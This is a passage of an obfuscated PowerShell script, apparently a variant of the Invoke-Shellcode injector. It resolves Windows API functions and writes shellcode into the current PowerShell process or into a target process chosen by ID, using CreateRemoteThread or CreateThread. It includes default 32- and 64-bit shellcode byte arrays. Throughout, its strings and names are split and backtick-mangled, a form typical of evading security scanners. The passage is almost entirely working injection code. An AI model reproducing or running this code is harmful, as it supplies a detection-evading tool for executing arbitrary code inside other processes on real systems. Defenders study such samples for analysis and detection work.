        ${thrEa`DhaND`LE} = ${CR`ea`TE`ThREAd}.Invoke( ( &('D'+'IR') vaRiAble:PX4).VAlUe::Zero, 0, ${CAl`l`STUBAddR`Ess}, ${BA`S`eADdReSs}, 0,  (  &('g'+'CI')  vARIaBlE:px4  ).VAlUE::Zero)
        if (!${TH`REadH`A`N`Dle})
        {
            Throw ('U'+('na'+'b')+'l'+("{1}{2}{0}"-f (("{0}{1}"-f' ','lau')+'n'),'e ','to')+'ch'+("{1}{0}" -f're',(' t'+'h'))+('a'+'d.'))
        }

        
        ${WAitFO`RS`InGLeoBJ`ECt}.Invoke(${TH`Re`AdHAn`dle}, 0xFFFFFFFF) | &("{2}{1}{0}"-f ("{0}{1}"-f '-N',('u'+'ll')),'ut','O')
        
        ${Vir`TUaL`FREe}.Invoke(${cALLSTUB`ADDR`E`sS}, ${C`AL`l`sTuB}.Length + 1, 0x8000) | &("{1}{0}"-f'l',("{0}{1}" -f('Ou'+'t-N'),'ul')) 
        ${VIr`T`U`ALFreE}.Invoke(${bAsea`dDre`ss}, ${ShE`L`lCODE}.Length + 1, 0x8000) | &("{1}{0}" -f ("{0}{1}"-f ('t-N'+'ul'),'l'),'Ou') 

        &("{1}{0}{3}{2}{4}" -f'i','Wr',('e'+'-V'),'t',("{2}{0}{1}"-f 'rb',('o'+'se'),'e')) ('Sh'+("{2}{0}{1}"-f'od','e ',('e'+'llc'))+("{0}{1}" -f 'i',('nje'+'c'))+('t'+'io')+("{1}{0}{2}" -f (("{1}{0}"-f 'ompl',' c')+'e'),'n','t')+'e!')
    }

    
    ${ISWow64pr`OCES`S`A`Ddr} = &("{4}{0}{1}{2}{3}" -f ("{1}{0}" -f ('o'+'cA'),'r'),('d'+'dr'),'e','ss',("{0}{1}" -f 'G',('e'+'t-P'))) kernel32.dll IsWow64Process

    ${Addr`Ess`W`iDTH} = ${nu`LL}

    try {
        ${Ad`DRessW`IdTh} = @(&("{3}{4}{2}{1}{0}"-f't',("{1}{0}" -f ('j'+'ec'),('Wm'+'iOb')),'t-','G','e') -Query (("{1}{0}"-f'T ',('SEL'+'EC'))+("{1}{0}{2}" -f('dd'+'r'),'A',('es'+'s'))+'Wi'+'dt'+('h '+'F')+'R'+'OM'+("{1}{3}{2}{0}"-f ('2_'+'Pr'),' W','3','in')+("{1}{0}"-f'or',(("{1}{0}"-f 'es','oc')+'s'))))[0] | &("{2}{0}{1}" -f'bj',('ec'+'t'),("{0}{2}{1}"-f 'Se',('t'+'-O'),('l'+'ec'))) -ExpandProperty AddressWidth
    } catch {
        throw ('Un'+("{1}{0}" -f('le'+' '),'ab')+'t'+("{1}{2}{0}" -f (("{1}{0}" -f'te','de')+'r'+("{0}{1}"-f'm','ine')),'o',' ')+' O'+("{0}{1}" -f('S '+'p'),'r')+("{1}{0}"-f'es','oc')+("{2}{1}{3}{0}"-f's ',('dr'+'e'),('s'+("{0}{1}"-f 'or',' a')+'d'),'s')+("{0}{2}{1}" -f'w',('t'+'h.'),'id'))
    }

    switch (${aDd`RE`sS`WIdTH}) {
        '32' {
            ${64`BIT`Os} = ${f`AlsE}
        }

        '64' {
            ${6`4Bi`TOs} = ${tr`Ue}

            ${IS`WOW`64ProCes`S`deL`EgaTe} = &("{3}{2}{1}{0}" -f("{0}{2}{1}" -f ('a'+'te'),'e',('T'+'yp')),'eg',('D'+'el'),("{1}{0}"-f '-',('Ge'+'t'))) @([IntPtr],  (  &('C'+'Hi'+'Ld'+('ItE'+'M')) VariaBlE:9kRa).VaLue.MakeByRefType()) ([Bool])
    	    ${Is`woW6`4PRo`ce`sS} =   ( &('vA'+('R'+'iA')+('B'+'Le'))  ("W"+'I8')  ).vaLuE::GetDelegateForFunctionPointer(${I`swO`w64PR`ocEsSaD`dR}, ${iswoW6`4proc`ESSdE`LE`GaTe})
        }

        default {
            throw ('I'+("{0}{1}"-f ('nv'+'a'),'l')+'id'+(' '+'OS')+("{1}{0}"-f ('d'+'dre'),' a')+("{1}{0}"-f('s '+'wi'),'s')+("{0}{2}{1}"-f('dt'+'h'),'de',' ')+'te'+'c'+("{0}{1}"-f't',('ed'+'.')))
        }
    }

    if (  (&(('vAr'+'I')+('AB'+'L')+'E') px4  -VAlUeO )::Size -eq 4)
    {
        ${POWErs`H`Ell`32b`It} = ${TR`Ue}
    }
    else
    {
        ${PowERshEll`32`BiT} = ${Fal`Se}
    }

    if (${psbOUNdp`A`Ra`mETeRS}[(("{0}{1}" -f('S'+("{0}{1}" -f 'hel','l')),'c')+'od'+'e')])
    {
        
        
        [Byte[]] ${shE`lLco`DE32} = ${Sh`e`LLcoDe}
        [Byte[]] ${s`HELlcoDe`64} = ${SHeLl`c`Od`e32}
    }
    else
    {
        
        
        
        
        
        [Byte[]] ${Sh`e`lL`coDe32} = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
                                  0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,
                                  0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,
                                  0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
                                  0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,
                                  0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,
                                  0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
                                  0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
                                  0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,
                                  0x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,0x87,0xff,0xd5,
                                  0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
                                  0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,
                                  0x61,0x6c,0x63,0x00)

        
        
        [Byte[]] ${sHe`llc`OdE`64} = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
                                  0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
                                  0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                                  0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
                                  0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
                                  0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,
                                  0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
                                  0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
                                  0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
                                  0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,
                                  0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,
                                  0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
                                  0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,
                                  0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,
                                  0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                                  0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,
                                  0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00)
    }

    if ( ${pSbOUn`dpA`R`Am`E`TerS}[(("{0}{1}" -f'Pr',('o'+'ce'))+'ss'+'ID')] )
    {
        
        ${O`PEnp`ROces`SA`ddr} = &("{0}{3}{2}{1}"-f ("{0}{1}" -f'Ge','t-'),'ss',('d'+'re'),("{0}{1}{2}"-f'Pr','o',('c'+'Ad'))) kernel32.dll OpenProcess
        ${OpENP`R`oC`E`ss`DelegaTE} = &("{3}{4}{2}{1}{0}" -f ("{0}{1}" -f ('t'+'eT'),('yp'+'e')),("{0}{1}"-f 'De',('l'+'ega')),'t-','G','e') @([UInt32], [Bool], [UInt32]) ([IntPtr])
        ${oPE`NprO`c`ESs} =   (  &(('I'+'TE')+'M')  (('VA'+'r')+('I'+'ABL')+"E"+(':'+'Wi8'))).VAlue::GetDelegateForFunctionPointer(${opE`N`PROCEssA`dDR}, ${o`PE`NpROcEssdELeG`A`TE})
        ${VIrtUa`lal`lOc`eXA`DDr} = &("{0}{2}{3}{1}"-f'G',("{3}{0}{2}{1}"-f 'r','s','es',('oc'+'Add')),'e',("{1}{0}"-f 'r',('t-'+'P'))) kernel32.dll VirtualAllocEx
        ${VIR`TU`AlALLO`CexdElEGa`TE} = &("{4}{3}{2}{0}{1}" -f'D',("{1}{2}{0}" -f 'pe',(("{1}{0}"-f 'egat','el')+'e'+'T'),'y'),'t-','e','G') @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
        ${V`IrT`UAl`ALloCEX} =   (&('gi')  ((("{0}{1}"-f'VA','ri')+'A')+('bLe'+':w')+'i8')).ValUe::GetDelegateForFunctionPointer(${viRtua`Lal`l`OCExad`dR}, ${VI`RTUALAlLO`cEx`DEL`egATE})
        ${W`RiTE`pROCESSmeMo`R`y`AD`DR} = &("{0}{2}{3}{1}{4}"-f 'G',("{0}{1}{2}"-f'ro','cA','dd'),'et','-P',("{1}{0}" -f('e'+'ss'),'r')) kernel32.dll WriteProcessMemory
        ${wRITEP`RO`c`ESsmeMoRydel`E`gaTE} = &("{4}{1}{0}{2}{3}" -f'T',("{2}{0}{1}" -f('leg'+'a'),'te','De'),'y','pe',("{1}{0}" -f ('et'+'-'),'G')) @([IntPtr], [IntPtr], [Byte[]], [UInt32],   ( &('D'+'ir') VAriAblE:V05 ).vaLUE.MakeByRefType()) ([Bool])
        ${W`RItep`Ro`cessm`eMoRY} =  (&('ch'+'I'+(("{1}{0}" -f 'Te','lDI')+'M')) vaRiaBLE:WI8  ).vALUe::GetDelegateForFunctionPointer(${WRI`Te`P`RO`Ces`smE`moRyaDDr}, ${wRi`Tepro`cESSmeMORy`d`ElE`Ga`TE})
        ${c`ReaTErEM`OtET`HrEada`Ddr} = &("{3}{0}{2}{4}{1}" -f('et'+'-'),("{1}{0}" -f('es'+'s'),'r'),'P','G',("{1}{0}" -f'd',('ro'+'cAd'))) kernel32.dll CreateRemoteThread
        ${cRE`A`T`EremoT`etHreadde`Lega`TE} = &("{1}{2}{0}" -f 'e',("{2}{1}{0}" -f('el'+'e'),('et-'+'D'),'G'),("{2}{0}{1}"-f'a',(("{0}{1}" -f 'teT','y')+'p'),'g')) @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${cREAtER`EmoTE`Th`R`E`AD} =  (&(('gE'+'T-I'+'te')+'m') VArIABLE:wI8).ValUE::GetDelegateForFunctionPointer(${CReaTEREmo`T`eTHR`eA`dADdr}, ${crEAte`RE`MOtEtH`R`eaD`deLeGatE})
        ${C`lOseh`ANDL`eaddR} = &("{1}{0}{3}{2}" -f('cA'+'d'),("{0}{1}" -f ('Ge'+'t-'),('P'+'ro')),'s',("{1}{0}" -f 's',('d'+'re'))) kernel32.dll CloseHandle
        ${CL`Os`EhA`NDLEdE`LEGaTe} = &("{1}{2}{3}{0}" -f("{0}{1}{2}" -f'g',('at'+'eT'),('y'+'pe')),("{1}{0}" -f'-',('G'+'et')),'De','le') @([IntPtr]) ([Bool])
        ${Clo`sEhA`NdLe} =   $wI8::GetDelegateForFunctionPointer(${cL`Os`ehanDleA`d`DR}, ${cLoseHA`NDl`ed`e`LegAte})
    
        &("{1}{2}{0}{3}" -f ("{0}{1}"-f'e',('-V'+'e')),'Wr','it',("{0}{1}" -f'r',('bo'+'se'))) ('In'+'j'+'e'+("{1}{0}"-f('in'+'g '),'ct')+("{0}{1}"-f('sh'+'e'),('l'+'lco'))+'de'+' '+'i'+("{1}{0}" -f' ',('n'+'to'))+('PI'+'D')+': '+"$ProcessId")
        
        if ( ${fo`RcE} -or ${P`sCMdl`ET}.ShouldContinue( (("{0}{1}"-f ('Do '+'yo'),'u ')+'wi'+("{0}{1}"-f 's',('h'+' t'))+'o'+(' c'+'a')+'r'+'r'+("{1}{0}"-f't',('y'+' ou'))+(' y'+'o')+('u'+'r ')+'e'+('vi'+'l')+("{2}{0}{1}"-f 's','?',(' pl'+'an'))),
                 "Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!    " ) )
        {
            &("{0}{2}{6}{3}{5}{1}{4}"-f ('I'+'nj'),'od',("{1}{0}{2}{3}" -f 'c','e',('t-'+'R'),('em'+'ote'+'Sh')),'ll','e','c','e') ${p`R`OCessiD}
        }
    }
    else
    {
        
        ${ViRt`U`A`LAllocaDDR} = &("{3}{2}{0}{1}"-f ('cA'+'d'),("{1}{0}"-f's',('dre'+'s')),'ro',("{1}{0}"-f('et-'+'P'),'G')) kernel32.dll VirtualAlloc
        ${v`IrTU`ALalLo`c`dElEgatE} = &("{0}{3}{2}{1}" -f("{1}{0}{2}"-f(("{0}{1}"-f't-D','e')+'le'),'Ge',('g'+'at')),('y'+'pe'),'T','e') @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
        ${vI`RtuA`L`Al`Loc} =  $wI8::GetDelegateForFunctionPointer(${v`I`R`TuALalLO`cAdDR}, ${viR`TuAL`A`lL`oCDeL`EgatE})
        ${vIrTUaL`FR`e`EaDdr} = &("{0}{3}{1}{2}"-f'Ge',("{0}{1}" -f ('-Pr'+'ocA'),'dd'),("{1}{0}" -f's',('r'+'es')),'t') kernel32.dll VirtualFree
        ${VIrTUA`L`FRe`ed`el`EgA`Te} = &("{3}{0}{2}{1}"-f ("{1}{0}"-f 'e',('t-'+'D')),("{0}{1}" -f 'Ty','pe'),("{0}{1}" -f 'le',('g'+'ate')),'Ge') @([IntPtr], [Uint32], [UInt32]) ([Bool])
        ${VI`R`TuaLFREE} =  ( &('ge'+('t-'+'Var')+'i'+('A'+'blE'))  ('WI'+'8')  -vaLuEOnly )::GetDelegateForFunctionPointer(${ViRt`UAl`F`Re`eAD`dR}, ${virtU`AlFr`eEDEL`eGATE})
        ${CreA`TET`H`R`eAD`Addr} = &("{2}{1}{0}{3}" -f('dd'+'r'),("{0}{1}" -f ('Pr'+'o'),'cA'),("{0}{1}" -f'G',('e'+'t-')),('es'+'s')) kernel32.dll CreateThread
        ${cR`EAtETh`RE`AdDElEgate} = &("{4}{1}{2}{3}{0}"-f ("{2}{1}{0}" -f('y'+'pe'),('t'+'eT'),'ga'),('-D'+'e'),'l','e',('Ge'+'t')) @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${CreAteThr`E`AD} =   $WI8::GetDelegateForFunctionPointer(${cReaTe`TH`R`e`AdADDR}, ${crea`T`eThreAD`del`E`gATE})
        ${WaITfo`R`SIngLEo`B`jeC`T`Ad`dr} = &("{1}{4}{0}{2}{3}"-f('o'+'cA'),'G',('d'+'dr'),('es'+'s'),("{1}{0}"-f'Pr',('et'+'-'))) kernel32.dll WaitForSingleObject
        ${wa`It`FoRSin`gLe`ObjECTde`lEGATE} = &("{2}{3}{4}{0}{1}" -f ('te'+'T'),('y'+'pe'),("{0}{1}"-f ('G'+'et-'),('De'+'le')),'g','a') @([IntPtr], [Int32]) ([Int])
        ${WAit`F`OrsINGlEOBJ`ECt} =  ( &('VA'+('ria'+'BL')+'e') ("w"+'I8')  -VaL)::GetDelegateForFunctionPointer(${WAitf`o`RSin`GLE`oBjE`C`TADDR}, ${Wai`Tfo`RSi`NG`l`EO`BJectDE`lEGaTe})
        
        &("{3}{1}{0}{2}" -f 'os',("{0}{1}"-f 'i',('te'+'-V'+'erb')),'e','Wr') ('In'+'je'+'ct'+("{1}{0}" -f ('n'+'g '),'i')+("{2}{1}{0}" -f 'o',('l'+'cod'+'e'+("{1}{0}"-f'nt',' i')),('sh'+'el'))+' '+'Po'+'we'+("{0}{1}"-f'rS',('he'+'ll')))
        
        if ( ${F`orcE} -or ${PSCMD`L`ET}.ShouldContinue( (("{1}{0}" -f('y'+'ou'),('D'+'o '))+' '+'w'+'is'+'h'+' t'+("{3}{0}{2}{1}" -f 'y',('u'+'r '),'o',('o'+' ca'+'rry'+("{1}{0}" -f 't ',' ou')))+("{0}{1}{2}"-f('e'+'vi'),('l'+' pl'),'an')+'s?'),
                 ('In'+("{1}{2}{0}"-f'll',('je'+'c'),('tin'+'g s'+'he'))+('co'+'d')+'e '+("{4}{2}{1}{0}{3}" -f'n',('e '+'ru'),'th','n',(("{1}{0}"-f 'to','in')+' '))+'i'+'ng'+' '+("{0}{1}" -f'Po',('we'+'r'))+'S'+'he'+("{0}{1}"-f ('ll'+' '),'pr')+("{0}{1}"-f('oc'+'e'),'s')+'s!') ) )
        {
            &("{4}{3}{2}{0}{1}" -f'd','e','o',('l'+'lc'),("{4}{1}{0}{2}{3}" -f ('e'+'ct-'),'j',('L'+("{0}{1}"-f'oc','alS')),'he','In'))
        }
    }   
}

